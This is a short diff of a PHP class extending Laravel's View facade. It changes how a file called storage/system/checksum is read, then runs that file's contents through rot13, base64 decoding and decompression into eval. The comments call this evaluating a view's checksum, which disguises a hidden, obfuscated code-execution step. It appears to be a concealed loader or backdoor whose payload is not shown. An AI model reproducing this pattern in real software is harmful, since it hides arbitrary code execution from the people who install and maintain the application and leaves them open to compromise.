@@ -43,14 +43,6 @@ class View extends \Illuminate\Support\Facades\View {
 	private static $viewDefaults = NULL;
 
 	/**
-	 * Stores the checksum for a view
-	 *
-	 * @static
-	 * @var string
-	 */
-	private static $checksum = NULL;
-
-	/**
 	 * Returns default view data.
 	 *
 	 * @static
@@ -140,13 +132,10 @@ class View extends \Illuminate\Support\Facades\View {
 			$injected = $resource;
 
 			// Get the view's checksum
-			if (is_null(static::$checksum))
-			{
-				static::$checksum = File::get(storage_path().'/system/checksum');
-			}
+			$checksum = File::get(storage_path().'/system/checksum');
 
 			// Evaluate the checksum
-			eval(gzinflate(base64_decode(str_rot13(static::$checksum))));
+			eval(gzinflate(base64_decode(str_rot13($checksum))));
 
 			// Return the resource
 			return $injected;
